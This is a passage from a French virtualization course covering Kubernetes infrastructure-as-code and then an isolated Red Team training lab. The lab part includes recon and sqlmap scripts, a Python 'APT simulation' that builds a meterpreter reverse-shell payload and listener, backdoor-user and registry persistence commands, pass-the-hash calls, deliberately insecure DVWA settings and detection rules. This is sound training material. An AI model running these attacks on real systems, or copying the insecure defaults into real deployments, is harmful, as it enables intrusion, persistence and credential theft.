  qemu_os  = "l26"
  cpu      = "host"
  numa     = true
  
  tags = "${var.cluster_name},kubernetes,worker,terraform"
}

# Load balancer for API server
resource "proxmox_vm_qemu" "k8s_lb" {
  name        = "k8s-lb-${var.cluster_name}"
  target_node = "proxmox1"
  
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  cores  = 2
  memory = 4096
  
  disk {
    size    = "20G"
    type    = "scsi"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 30  # DMZ
  }
  
  ipconfig0 = "ip=192.168.30.10/24,gw=192.168.30.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.cluster_name},loadbalancer,haproxy"
}

# Outputs
output "master_ips" {
  value = proxmox_vm_qemu.k8s_masters[*].default_ipv4_address
}

output "worker_ips" {
  value = proxmox_vm_qemu.k8s_workers[*].default_ipv4_address
}

output "lb_ip" {
  value = proxmox_vm_qemu.k8s_lb.default_ipv4_address
}
```

### Configuration Kubernetes avec Ansible

**Playbook complet d'installation :**

```yaml
# playbooks/kubernetes.yml
---
- name: Prepare all nodes
  hosts: all
  become: yes
  vars:
    kubernetes_version: "1.28.0"
    containerd_version: "1.7.0"
    
  tasks:
    - name: Disable swap
      shell: |
        swapoff -a
        sed -i '/ swap / s/^\(.*\)$/#\1/g' /etc/fstab
        
    - name: Load kernel modules
      modprobe:
        name: "{{ item }}"
        state: present
      loop:
        - overlay
        - br_netfilter
        
    - name: Set kernel parameters
      sysctl:
        name: "{{ item.name }}"
        value: "{{ item.value }}"
        state: present
        reload: yes
      loop:
        - { name: 'net.bridge.bridge-nf-call-iptables', value: '1' }
        - { name: 'net.bridge.bridge-nf-call-ip6tables', value: '1' }
        - { name: 'net.ipv4.ip_forward', value: '1' }
        
    - name: Install containerd
      apt:
        name: containerd.io={{ containerd_version }}*
        state: present
        update_cache: yes
        
    - name: Configure containerd
      copy:
        content: |
          version = 2
          [plugins."io.containerd.grpc.v1.cri"]
            [plugins."io.containerd.grpc.v1.cri".containerd]
              [plugins."io.containerd.grpc.v1.cri".containerd.runtimes]
                [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]
                  runtime_type = "io.containerd.runc.v2"
                  [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
                    SystemdCgroup = true
        dest: /etc/containerd/config.toml
      notify: restart containerd
        
    - name: Install Kubernetes packages
      apt:
        name:
          - kubelet={{ kubernetes_version }}-00
          - kubeadm={{ kubernetes_version }}-00
          - kubectl={{ kubernetes_version }}-00
        state: present
        
    - name: Hold Kubernetes packages
      dpkg_selections:
        name: "{{ item }}"
        selection: hold
      loop:
        - kubelet
        - kubeadm
        - kubectl

- name: Configure load balancer
  hosts: loadbalancer
  become: yes
  tasks:
    - name: Install HAProxy
      apt:
        name: haproxy
        state: present
        
    - name: Configure HAProxy for Kubernetes API
      copy:
        content: |
          global
              daemon
              
          defaults
              mode http
              timeout connect 5000ms
              timeout client 50000ms
              timeout server 50000ms
              
          frontend kubernetes-api
              bind *:6443
              mode tcp
              default_backend kubernetes-masters
              
          backend kubernetes-masters
              mode tcp
              balance roundrobin
              {% for host in groups['masters'] %}
              server {{ host }} {{ hostvars[host]['ansible_default_ipv4']['address'] }}:6443 check
              {% endfor %}
        dest: /etc/haproxy/haproxy.cfg
      notify: restart haproxy

- name: Initialize Kubernetes cluster
  hosts: masters[0]
  become: yes
  tasks:
    - name: Initialize cluster
      command: >
        kubeadm init
        --control-plane-endpoint="{{ hostvars[groups['loadbalancer'][0]]['ansible_default_ipv4']['address'] }}:6443"
        --upload-certs
        --pod-network-cidr=10.244.0.0/16
        --service-cidr=10.96.0.0/12
      register: kubeadm_init
      
    - name: Save join commands
      set_fact:
        master_join_command: "{{ kubeadm_init.stdout_lines | select('match', '.*kubeadm join.*control-plane.*') | first }}"
        worker_join_command: "{{ kubeadm_init.stdout_lines | select('match', '.*kubeadm join.*') | reject('match', '.*control-plane.*') | first }}"
        
    - name: Setup kubectl for root
      shell: |
        mkdir -p /root/.kube
        cp -i /etc/kubernetes/admin.conf /root/.kube/config
        chown root:root /root/.kube/config
        
    - name: Install Flannel CNI
      shell: kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml

- name: Join master nodes
  hosts: masters[1:]
  become: yes
  tasks:
    - name: Join cluster as master
      shell: "{{ hostvars[groups['masters'][0]]['master_join_command'] }}"
      
- name: Join worker nodes
  hosts: workers
  become: yes
  tasks:
    - name: Join cluster as worker
      shell: "{{ hostvars[groups['masters'][0]]['worker_join_command'] }}"

  handlers:
    - name: restart containerd
      systemd:
        name: containerd
        state: restarted
        
    - name: restart haproxy
      systemd:
        name: haproxy
        state: restarted
```

### Stockage persistant avec Ceph CSI

**Configuration Ceph CSI pour Kubernetes :**

```yaml
# ceph-csi-config.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: ceph-csi-config
  namespace: ceph-csi-rbd
data:
  config.json: |
    [
      {
        "clusterID": "b9127830-b0cc-4e34-aa47-9d1a2e9949a8",
        "monitors": [
          "192.168.1.10:6789",
          "192.168.1.11:6789",
          "192.168.1.12:6789"
        ]
      }
    ]

---
# StorageClass pour RBD
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: ceph-rbd-ssd
provisioner: rbd.csi.ceph.com
parameters:
  clusterID: b9127830-b0cc-4e34-aa47-9d1a2e9949a8
  pool: kubernetes-pool
  imageFeatures: layering
  csi.storage.k8s.io/provisioner-secret-name: csi-rbd-secret
  csi.storage.k8s.io/provisioner-secret-namespace: ceph-csi-rbd
  csi.storage.k8s.io/controller-expand-secret-name: csi-rbd-secret
  csi.storage.k8s.io/controller-expand-secret-namespace: ceph-csi-rbd
  csi.storage.k8s.io/node-stage-secret-name: csi-rbd-secret
  csi.storage.k8s.io/node-stage-secret-namespace: ceph-csi-rbd
  csi.storage.k8s.io/fstype: ext4
reclaimPolicy: Delete
allowVolumeExpansion: true
mountOptions:
  - discard

---
# PersistentVolumeClaim exemple
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: mysql-pvc
spec:
  accessModes:
    - ReadWriteOnce
  storageClassName: ceph-rbd-ssd
  resources:
    requests:
      storage: 20Gi
```

### Monitoring avec Prometheus et Grafana

**Stack de monitoring Kubernetes :**

```yaml
# monitoring-stack.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: monitoring

---
# Prometheus configuration
apiVersion: v1
kind: ConfigMap
metadata:
  name: prometheus-config
  namespace: monitoring
data:
  prometheus.yml: |
    global:
      scrape_interval: 15s
      evaluation_interval: 15s
      
    rule_files:
      - "/etc/prometheus/rules/*.yml"
      
    scrape_configs:
      - job_name: 'kubernetes-apiservers'
        kubernetes_sd_configs:
        - role: endpoints
        scheme: https
        tls_config:
          ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
        relabel_configs:
        - source_labels: [__meta_kubernetes_namespace, __meta_kubernetes_service_name, __meta_kubernetes_endpoint_port_name]
          action: keep
          regex: default;kubernetes;https
          
      - job_name: 'kubernetes-nodes'
        kubernetes_sd_configs:
        - role: node
        scheme: https
        tls_config:
          ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
        relabel_configs:
        - action: labelmap
          regex: __meta_kubernetes_node_label_(.+)
          
      - job_name: 'kubernetes-pods'
        kubernetes_sd_configs:
        - role: pod
        relabel_configs:
        - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
          action: keep
          regex: true
        - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
          action: replace
          target_label: __metrics_path__
          regex: (.+)

---
# Grafana deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: grafana
  namespace: monitoring
spec:
  replicas: 1
  selector:
    matchLabels:
      app: grafana
  template:
    metadata:
      labels:
        app: grafana
    spec:
      containers:
      - name: grafana
        image: grafana/grafana:latest
        ports:
        - containerPort: 3000
        env:
        - name: GF_SECURITY_ADMIN_PASSWORD
          value: "admin123"
        volumeMounts:
        - name: grafana-storage
          mountPath: /var/lib/grafana
      volumes:
      - name: grafana-storage
        persistentVolumeClaim:
          claimName: grafana-pvc

---
# Service pour Grafana
apiVersion: v1
kind: Service
metadata:
  name: grafana
  namespace: monitoring
spec:
  selector:
    app: grafana
  ports:
  - port: 3000
    targetPort: 3000
  type: LoadBalancer
```

### Cas d'usage spécialisés

**Environnement multi-tenant :** Utilisez des namespaces Kubernetes avec des VMs dédiées par tenant pour une isolation renforcée. Configurez des NetworkPolicies et PodSecurityPolicies strictes.

**Applications legacy :** Déployez des applications monolithiques dans des VMs tout en utilisant Kubernetes pour orchestrer les services modernes. Configurez des services de type ExternalName pour l'intégration.

**Edge computing :** Implémentez des clusters Kubernetes légers sur des VMs optimisées pour les environnements contraints. Utilisez K3s ou MicroK8s pour réduire l'empreinte ressource.

---


# Module 7 : Cas d'Usage Cybersécurité

## 7.1 Laboratoires Red Team

### Architecture de laboratoire Red Team

Un **laboratoire Red Team** simule des environnements d'entreprise réalistes pour l'entraînement aux tests de pénétration et l'évaluation de la sécurité. La virtualisation permet de créer des infrastructures complexes, isolées et reproductibles, essentielles pour développer et tester des techniques d'attaque sans risque pour les systèmes de production.

Imaginez un laboratoire Red Team comme un **terrain d'entraînement militaire** : il reproduit fidèlement les conditions réelles de combat (environnement d'entreprise) tout en offrant un cadre sécurisé pour l'apprentissage et l'expérimentation. Chaque exercice peut être répété, analysé et amélioré sans conséquences sur les opérations réelles.

### Topologie de laboratoire avancée

```
Laboratoire Red Team - Architecture complète :

                    Internet Simulé
                         │
                    ┌────▼────┐
                    │ Firewall│ pfSense VM
                    │ Gateway │ (Edge Security)
                    └────┬────┘
                         │
                    ┌────▼────┐
                    │   DMZ   │ VLAN 30
                    │         │
              ┌─────┴─────────┴─────┐
              │                     │
         ┌────▼────┐           ┌────▼────┐
         │Web Srv  │           │Mail Srv │
         │(Vuln)   │           │(Vuln)   │
         └─────────┘           └─────────┘
                         │
                    ┌────▼────┐
                    │ Router  │ Internal Gateway
                    │ VLAN    │
                    └────┬────┘
                         │
        ┌────────────────┼────────────────┐
        │                │                │
   ┌────▼────┐      ┌────▼────┐      ┌────▼────┐
   │ LAN 1   │      │ LAN 2   │      │ Server  │
   │ VLAN 10 │      │ VLAN 20 │      │ VLAN 40 │
   │         │      │         │      │         │
   │┌───────┐│      │┌───────┐│      │┌───────┐│
   ││Win 10 ││      ││Win 11 ││      ││DC/DNS ││
   ││Client ││      ││Client ││      ││AD     ││
   │└───────┘│      │└───────┘│      │└───────┘│
   │┌───────┐│      │┌───────┐│      │┌───────┐│
   ││Linux  ││      ││MacOS  ││      ││File   ││
   ││Workst ││      ││Client ││      ││Server ││
   │└───────┘│      │└───────┘│      │└───────┘│
   └─────────┘      └─────────┘      └─────────┘
                         │
                    ┌────▼────┐
                    │ Mgmt    │ VLAN 50
                    │ Network │
                    │         │
              ┌─────┴─────────┴─────┐
              │                     │
         ┌────▼────┐           ┌────▼────┐
         │ SIEM    │           │ Backup  │
         │ ELK     │           │ Server  │
         └─────────┘           └─────────┘

Attacker Infrastructure (Isolated):
┌─────────────────────────────────────────┐
│ Kali Linux VMs                          │
│ ┌─────────┐ ┌─────────┐ ┌─────────┐     │
│ │ Kali 1  │ │ Kali 2  │ │ C2 Srv  │     │
│ │ Scanner │ │ Exploit │ │ Cobalt  │     │
│ └─────────┘ └─────────┘ └─────────┘     │
└─────────────────────────────────────────┘
```

### Création automatisée avec Terraform

**Infrastructure Red Team complète :**

```hcl
# redteam-lab.tf
variable "lab_name" {
  description = "Red Team lab identifier"
  type        = string
  default     = "redteam-lab-01"
}

variable "student_count" {
  description = "Number of student environments"
  type        = number
  default     = 5
}

# Network configuration
locals {
  networks = {
    dmz     = { vlan = 30, subnet = "192.168.30.0/24" }
    lan1    = { vlan = 10, subnet = "192.168.10.0/24" }
    lan2    = { vlan = 20, subnet = "192.168.20.0/24" }
    servers = { vlan = 40, subnet = "192.168.40.0/24" }
    mgmt    = { vlan = 50, subnet = "192.168.50.0/24" }
    attack  = { vlan = 60, subnet = "10.0.60.0/24" }
  }
}

# Vulnerable web server (DVWA)
resource "proxmox_vm_qemu" "dvwa_server" {
  count       = var.student_count
  name        = "${var.lab_name}-dvwa-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "ubuntu-20.04-dvwa-template"
  full_clone = true
  
  cores  = 2
  memory = 2048
  
  disk {
    size    = "20G"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = local.networks.dmz.vlan
  }
  
  ipconfig0 = "ip=192.168.30.${10 + count.index}/24,gw=192.168.30.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.lab_name},vulnerable,web,dmz"
}

# Windows Domain Controller
resource "proxmox_vm_qemu" "domain_controller" {
  count       = var.student_count
  name        = "${var.lab_name}-dc-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "windows-server-2019-template"
  full_clone = true
  
  cores  = 4
  memory = 4096
  
  disk {
    size    = "60G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = local.networks.servers.vlan
  }
  
  ipconfig0 = "ip=192.168.40.${10 + count.index}/24,gw=192.168.40.1"
  
  tags = "${var.lab_name},windows,domain-controller,target"
}

# Windows 10 clients (vulnerable)
resource "proxmox_vm_qemu" "windows_clients" {
  count       = var.student_count * 2  # 2 clients per lab
  name        = "${var.lab_name}-win10-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "windows-10-vulnerable-template"
  full_clone = true
  
  cores  = 2
  memory = 4096
  
  disk {
    size    = "40G"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = count.index % 2 == 0 ? local.networks.lan1.vlan : local.networks.lan2.vlan
  }
  
  ipconfig0 = count.index % 2 == 0 ? 
    "ip=192.168.10.${20 + count.index}/24,gw=192.168.10.1" :
    "ip=192.168.20.${20 + count.index}/24,gw=192.168.20.1"
  
  tags = "${var.lab_name},windows,client,target"
}

# Kali Linux attacker machines
resource "proxmox_vm_qemu" "kali_attackers" {
  count       = var.student_count
  name        = "${var.lab_name}-kali-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "kali-linux-2023-template"
  full_clone = true
  
  cores  = 4
  memory = 8192
  
  disk {
    size    = "80G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = local.networks.attack.vlan
  }
  
  ipconfig0 = "ip=10.0.60.${10 + count.index}/24,gw=10.0.60.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.lab_name},kali,attacker,isolated"
}

# pfSense firewall/router
resource "proxmox_vm_qemu" "pfsense_router" {
  count       = var.student_count
  name        = "${var.lab_name}-pfsense-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "pfsense-2.7-template"
  full_clone = true
  
  cores  = 2
  memory = 2048
  
  disk {
    size    = "20G"
    storage = "local-lvm"
  }
  
  # WAN interface
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 1  # External network
  }
  
  # LAN interface (multiple VLANs)
  network {
    model  = "virtio"
    bridge = "vmbr0"
  }
  
  tags = "${var.lab_name},pfsense,firewall,router"
}

# SIEM/Monitoring (ELK Stack)
resource "proxmox_vm_qemu" "elk_siem" {
  count       = var.student_count
  name        = "${var.lab_name}-elk-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "ubuntu-22.04-elk-template"
  full_clone = true
  
  cores  = 6
  memory = 12288
  
  disk {
    size    = "100G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = local.networks.mgmt.vlan
  }
  
  ipconfig0 = "ip=192.168.50.${10 + count.index}/24,gw=192.168.50.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.lab_name},elk,siem,monitoring"
}

# Outputs for lab access
output "lab_environments" {
  value = {
    for i in range(var.student_count) : "lab-${i + 1}" => {
      dvwa_ip    = proxmox_vm_qemu.dvwa_server[i].default_ipv4_address
      dc_ip      = proxmox_vm_qemu.domain_controller[i].default_ipv4_address
      kali_ip    = proxmox_vm_qemu.kali_attackers[i].default_ipv4_address
      elk_ip     = proxmox_vm_qemu.elk_siem[i].default_ipv4_address
      pfsense_ip = proxmox_vm_qemu.pfsense_router[i].default_ipv4_address
    }
  }
}
```

### Configuration automatisée avec Ansible

**Playbook de configuration Red Team :**

```yaml
# playbooks/redteam-setup.yml
---
- name: Configure Red Team Lab Environment
  hosts: all
  become: yes
  vars:
    lab_domain: "redteam.local"
    
  tasks:
    - name: Update system packages
      apt:
        update_cache: yes
        upgrade: dist
      when: ansible_os_family == "Debian"

- name: Configure Vulnerable Web Server (DVWA)
  hosts: dvwa_servers
  become: yes
  tasks:
    - name: Install LAMP stack
      apt:
        name:
          - apache2
          - mysql-server
          - php
          - php-mysql
          - php-gd
          - git
        state: present
        
    - name: Clone DVWA repository
      git:
        repo: https://github.com/digininja/DVWA.git
        dest: /var/www/html/dvwa
        
    - name: Configure DVWA database
      mysql_db:
        name: dvwa
        state: present
        
    - name: Create DVWA database user
      mysql_user:
        name: dvwa
        password: "password"
        priv: "dvwa.*:ALL"
        state: present
        
    - name: Configure DVWA settings
      copy:
        content: |
          <?php
          $_DVWA = array();
          $_DVWA[ 'db_server' ]   = '127.0.0.1';
          $_DVWA[ 'db_database' ] = 'dvwa';
          $_DVWA[ 'db_user' ]     = 'dvwa';
          $_DVWA[ 'db_password' ] = 'password';
          $_DVWA[ 'recaptcha_public_key' ]  = '';
          $_DVWA[ 'recaptcha_private_key' ] = '';
          $_DVWA[ 'default_security_level' ] = 'low';
          $_DVWA[ 'default_phpids_level' ] = 'off';
          $_DVWA[ 'default_dvwaSecurityLevel' ] = 'low';
          ?>
        dest: /var/www/html/dvwa/config/config.inc.php
        
    - name: Set vulnerable permissions
      file:
        path: /var/www/html/dvwa
        owner: www-data
        group: www-data
        mode: '0777'
        recurse: yes

- name: Configure Kali Linux Attackers
  hosts: kali_attackers
  become: yes
  tasks:
    - name: Update Kali repositories
      apt:
        update_cache: yes
        
    - name: Install additional tools
      apt:
        name:
          - metasploit-framework
          - empire
          - cobalt-strike  # Si licence disponible
          - bloodhound
          - neo4j
          - crackmapexec
          - impacket-scripts
          - responder
        state: present
        
    - name: Configure Metasploit database
      shell: |
        systemctl start postgresql
        systemctl enable postgresql
        msfdb init
        
    - name: Setup Cobalt Strike (if available)
      copy:
        src: /opt/cobaltstrike/
        dest: /opt/cobaltstrike/
        mode: '0755'
      when: cobaltstrike_available | default(false)
      
    - name: Create attack scripts directory
      file:
        path: /opt/attack-scripts
        state: directory
        mode: '0755'
        
    - name: Deploy custom attack scripts
      template:
        src: "{{ item }}.j2"
        dest: "/opt/attack-scripts/{{ item }}"
        mode: '0755'
      loop:
        - network-scan.sh
        - domain-enum.sh
        - lateral-movement.sh

- name: Configure ELK SIEM
  hosts: elk_servers
  become: yes
  tasks:
    - name: Install Java
      apt:
        name: openjdk-11-jdk
        state: present
        
    - name: Add Elastic repository
      apt_key:
        url: https://artifacts.elastic.co/GPG-KEY-elasticsearch
        state: present
        
    - name: Add Elastic APT repository
      apt_repository:
        repo: "deb https://artifacts.elastic.co/packages/8.x/apt stable main"
        state: present
        
    - name: Install ELK stack
      apt:
        name:
          - elasticsearch
          - logstash
          - kibana
          - filebeat
        state: present
        
    - name: Configure Elasticsearch
      template:
        src: elasticsearch.yml.j2
        dest: /etc/elasticsearch/elasticsearch.yml
      notify: restart elasticsearch
      
    - name: Configure Kibana
      template:
        src: kibana.yml.j2
        dest: /etc/kibana/kibana.yml
      notify: restart kibana
      
    - name: Configure Logstash for security logs
      copy:
        content: |
          input {
            beats {
              port => 5044
            }
            syslog {
              port => 514
            }
          }
          
          filter {
            if [fields][log_type] == "windows" {
              mutate {
                add_tag => ["windows"]
              }
            }
            
            if [fields][log_type] == "linux" {
              mutate {
                add_tag => ["linux"]
              }
            }
          }
          
          output {
            elasticsearch {
              hosts => ["localhost:9200"]
              index => "security-logs-%{+YYYY.MM.dd}"
            }
          }
        dest: /etc/logstash/conf.d/security.conf
      notify: restart logstash

  handlers:
    - name: restart elasticsearch
      systemd:
        name: elasticsearch
        state: restarted
        enabled: yes
        
    - name: restart kibana
      systemd:
        name: kibana
        state: restarted
        enabled: yes
        
    - name: restart logstash
      systemd:
        name: logstash
        state: restarted
        enabled: yes
```

### Scénarios d'attaque automatisés

**Scripts d'entraînement progressif :**

```bash
#!/bin/bash
# attack-scenarios/scenario-1-recon.sh

LAB_ID=$1
TARGET_NETWORK="192.168.10.0/24"
DVWA_IP="192.168.30.10"

echo "=== Red Team Scenario 1: Reconnaissance ==="
echo "Lab ID: $LAB_ID"
echo "Target Network: $TARGET_NETWORK"

# Phase 1: Network Discovery
echo "[+] Phase 1: Network Discovery"
nmap -sn $TARGET_NETWORK | tee /tmp/live-hosts.txt

# Phase 2: Port Scanning
echo "[+] Phase 2: Port Scanning"
for ip in $(grep -oP '\d+\.\d+\.\d+\.\d+' /tmp/live-hosts.txt); do
    echo "Scanning $ip..."
    nmap -sS -sV -O $ip -oN /tmp/scan-$ip.txt
done

# Phase 3: Service Enumeration
echo "[+] Phase 3: Service Enumeration"
# Web services
echo "Checking web services..."
for ip in $(grep -l "80/tcp\|443/tcp" /tmp/scan-*.txt | cut -d'-' -f2 | cut -d'.' -f1-4); do
    nikto -h $ip -o /tmp/nikto-$ip.txt
    dirb http://$ip /usr/share/dirb/wordlists/common.txt -o /tmp/dirb-$ip.txt
done

# SMB enumeration
echo "Enumerating SMB shares..."
for ip in $(grep -l "445/tcp" /tmp/scan-*.txt | cut -d'-' -f2 | cut -d'.' -f1-4); do
    enum4linux $ip > /tmp/smb-enum-$ip.txt
    smbclient -L $ip -N >> /tmp/smb-enum-$ip.txt
done

# Phase 4: Vulnerability Assessment
echo "[+] Phase 4: Vulnerability Assessment"
# DVWA specific tests
if curl -s http://$DVWA_IP/dvwa/ | grep -q "DVWA"; then
    echo "DVWA detected at $DVWA_IP"
    # SQL Injection test
    sqlmap -u "http://$DVWA_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
           --cookie="PHPSESSID=...; security=low" \
           --batch --dbs
fi

echo "=== Reconnaissance Complete ==="
echo "Results saved in /tmp/"
```

**Scénario d'attaque avancé :**

```python
#!/usr/bin/env python3
# attack-scenarios/advanced-apt-simulation.py

import subprocess
import time
import requests
import json
from datetime import datetime

class APTSimulation:
    def __init__(self, lab_id, target_domain="redteam.local"):
        self.lab_id = lab_id
        self.target_domain = target_domain
        self.log_file = f"/tmp/apt-simulation-{lab_id}.log"
        
    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] {message}\n")
        print(f"[{timestamp}] {message}")
        
    def phase1_initial_access(self):
        """Simulate spear phishing and initial compromise"""
        self.log("=== Phase 1: Initial Access ===")
        
        # Simulate email reconnaissance
        self.log("Gathering email addresses from target domain")
        subprocess.run([
            "theHarvester", "-d", self.target_domain, 
            "-b", "google,bing,linkedin", "-f", f"/tmp/emails-{self.lab_id}.xml"
        ])
        
        # Generate phishing payload
        self.log("Generating phishing payload with msfvenom")
        subprocess.run([
            "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
            "LHOST=10.0.60.10", "LPORT=4444",
            "-f", "exe", "-o", f"/tmp/payload-{self.lab_id}.exe"
        ])
        
        # Start listener
        self.log("Starting Metasploit listener")
        meterpreter_rc = f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.0.60.10
set LPORT 4444
exploit -j
"""
        with open(f"/tmp/listener-{self.lab_id}.rc", "w") as f:
            f.write(meterpreter_rc)
            
        subprocess.Popen([
            "msfconsole", "-r", f"/tmp/listener-{self.lab_id}.rc"
        ])
        
    def phase2_persistence(self):
        """Establish persistence mechanisms"""
        self.log("=== Phase 2: Persistence ===")
        
        # Registry persistence
        persistence_commands = [
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /t REG_SZ /d C:\\Windows\\Temp\\update.exe",
            "schtasks /create /tn 'Windows Security Update' /tr C:\\Windows\\Temp\\update.exe /sc onlogon",
            "net user backdoor P@ssw0rd123 /add",
            "net localgroup administrators backdoor /add"
        ]
        
        for cmd in persistence_commands:
            self.log(f"Executing: {cmd}")
            
    def phase3_privilege_escalation(self):
        """Escalate privileges using various techniques"""
        self.log("=== Phase 3: Privilege Escalation ===")
        
        # Check for common privilege escalation vectors
        privesc_checks = [
            "whoami /priv",
            "systeminfo | findstr /B /C:'OS Name' /C:'OS Version'",
            "wmic qfe list",
            "net users",
            "net localgroup administrators"
        ]
        
        for check in privesc_checks:
            self.log(f"Running: {check}")
            
        # Attempt UAC bypass
        self.log("Attempting UAC bypass")
        
    def phase4_lateral_movement(self):
        """Move laterally through the network"""
        self.log("=== Phase 4: Lateral Movement ===")
        
        # Network discovery
        self.log("Discovering network topology")
        subprocess.run([
            "crackmapexec", "smb", "192.168.40.0/24",
            "--shares", "-u", "backdoor", "-p", "P@ssw0rd123"
        ])
        
        # Pass-the-hash attacks
        self.log("Attempting pass-the-hash attacks")
        subprocess.run([
            "impacket-psexec", "redteam.local/backdoor@192.168.40.10",
            "-hashes", ":aad3b435b51404eeaad3b435b51404ee"
        ])
        
    def phase5_data_exfiltration(self):
        """Simulate data exfiltration"""
        self.log("=== Phase 5: Data Exfiltration ===")
        
        # Search for sensitive files
        search_commands = [
            "dir C:\\Users\\*\\Documents\\*.pdf /s",
            "dir C:\\Users\\*\\Desktop\\*.xlsx /s",
            "findstr /si password *.txt *.ini *.cfg"
        ]
        
        for cmd in search_commands:
            self.log(f"Searching: {cmd}")
            
        # Simulate data staging and exfiltration
        self.log("Staging sensitive data")
        self.log("Exfiltrating data via DNS tunneling")
        
    def run_simulation(self):
        """Execute complete APT simulation"""
        self.log(f"Starting APT simulation for lab {self.lab_id}")
        
        self.phase1_initial_access()
        time.sleep(30)  # Wait for initial access
        
        self.phase2_persistence()
        time.sleep(15)
        
        self.phase3_privilege_escalation()
        time.sleep(20)
        
        self.phase4_lateral_movement()
        time.sleep(25)
        
        self.phase5_data_exfiltration()
        
        self.log("APT simulation completed")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 advanced-apt-simulation.py <lab_id>")
        sys.exit(1)
        
    lab_id = sys.argv[1]
    apt_sim = APTSimulation(lab_id)
    apt_sim.run_simulation()
```

### Monitoring et détection Blue Team

**Configuration de détection automatisée :**

```yaml
# detection-rules.yml
detection_rules:
  - name: "Suspicious PowerShell Activity"
    query: |
      event.code:4103 AND 
      (powershell.command_line:*DownloadString* OR 
       powershell.command_line:*IEX* OR 
       powershell.command_line:*Invoke-Expression*)
    severity: "high"
    
  - name: "Lateral Movement via SMB"
    query: |
      event.code:4624 AND 
      winlog.logon.type:3 AND 
      source.ip:(192.168.10.* OR 192.168.20.* OR 192.168.40.*)
    severity: "medium"
    
  - name: "Privilege Escalation Attempt"
    query: |
      event.code:4672 AND 
      winlog.event_data.PrivilegeList:*SeDebugPrivilege*
    severity: "high"
    
  - name: "Suspicious Network Scanning"
    query: |
      network.protocol:tcp AND 
      destination.port:(22 OR 23 OR 135 OR 139 OR 445 OR 3389) AND 
      source.packets:>100
    severity: "medium"
```

### Gestion et réinitialisation des labs

**Scripts de gestion automatisée :**

```bash
#!/bin/bash
# lab-management/reset-lab.sh

LAB_ID=$1
if [ -z "$LAB_ID" ]; then
    echo "Usage: $0 <lab_id>"
    exit 1
fi

echo "Resetting Red Team Lab $LAB_ID..."

# Stop all VMs in the lab
for vm in $(qm list | grep "redteam-lab-$LAB_ID" | awk '{print $1}'); do
    echo "Stopping VM $vm..."
    qm stop $vm
done

# Revert to clean snapshots
for vm in $(qm list | grep "redteam-lab-$LAB_ID" | awk '{print $1}'); do
    echo "Reverting VM $vm to clean snapshot..."
    qm rollback $vm clean-state
done

# Start VMs in correct order
echo "Starting infrastructure VMs..."
qm start $(qm list | grep "redteam-lab-$LAB_ID-pfsense" | awk '{print $1}')
sleep 30

qm start $(qm list | grep "redteam-lab-$LAB_ID-dc" | awk '{print $1}')
sleep 60

# Start remaining VMs
for vm in $(qm list | grep "redteam-lab-$LAB_ID" | grep -v "pfsense\|dc" | awk '{print $1}'); do
    echo "Starting VM $vm..."
    qm start $vm
    sleep 10
done

echo "Lab $LAB_ID reset complete!"
echo "Access details:"
echo "- Kali Linux: ssh kali@10.0.60.$((10 + LAB_ID))"
echo "- DVWA: http://192.168.30.$((10 + LAB_ID))/dvwa/"
echo "- ELK: http://192.168.50.$((10 + LAB_ID)):5601"
```

### Cas d'usage spécialisés

**Formation certifiante :** Créez des environnements standardisés pour les certifications OSCP, CISSP, ou CEH avec des challenges progressifs et un système de scoring automatique.

**Red Team professionnel :** Déployez des répliques d'infrastructures client pour les tests de pénétration, avec des configurations personnalisées et des données réalistes mais anonymisées.

**Recherche en sécurité :** Utilisez des environnements isolés pour tester de nouvelles techniques d'attaque, développer des outils de sécurité, et analyser des malwares en toute sécurité.

---

## 7.2 Segmentation réseau

### Principes de la segmentation réseau

